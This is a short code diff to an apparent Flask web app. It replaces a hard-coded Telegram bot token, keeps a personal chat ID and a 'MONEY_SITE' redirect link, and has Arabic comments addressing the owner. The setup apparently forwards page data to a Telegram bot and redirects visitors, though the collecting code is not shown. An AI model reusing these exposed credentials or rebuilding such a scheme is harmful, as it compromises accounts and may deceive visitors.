@@ -4,9 +4,9 @@ from flask import Flask, request, redirect
 
 app = Flask(__name__)
 
-# --- بياناتك الجديدة والمؤكدة ---
-BOT_TOKEN = "8059077088:AAFQQ-DYX4NXIWBG7VaLTnMhsGinXUnGGM" # من صورة BotFather تاعك
-CHAT_ID = "7479786207" # الـ ID تاعك الشخصي اللي جناه من Userinfo
+# --- البيانات الجديدة والمؤكدة ---
+BOT_TOKEN = "8416648663:AAHP3pqJAMOcNGG5LY6hqOwikiiPxiXuRlA"
+CHAT_ID = "7479786207"
 MONEY_SITE = "https://trianglerockers.com/1885419"
 
 HTML_PAGE = """
